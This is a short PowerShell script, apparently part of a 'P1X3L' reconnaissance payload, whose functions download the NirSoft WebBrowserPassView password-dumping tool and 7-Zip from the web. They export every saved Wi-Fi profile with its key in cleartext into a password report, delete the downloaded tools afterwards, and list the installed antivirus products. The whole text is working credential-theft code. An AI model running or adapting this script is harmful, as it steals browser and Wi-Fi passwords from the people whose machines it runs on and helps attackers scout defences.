$desktop = ([Environment]::GetFolderPath("Desktop"))
function Get-Nirsoft {

  cd $RECONAPPS
  Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
  Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
  Expand-Archive 7z.zip 
  .\7z\7za.exe e wbpv.zip

}

function Wifi {
Set-Location -Path $P1X3L; netsh wlan export profile key=clear
Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\P1X3l\\RECON_APPS\\", ''} | % {$_ -replace '.xml:22:', ''} > $P1X3L\WiFi_Passwords-RECON_Report.txt
Remove-Item -Path "$P1X3L\RECON_APPS" -Force -Recurse;
}

function version-av {
  cd $P1X3L
  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath $P1X3L\resultat.txt -Encoding utf8
}
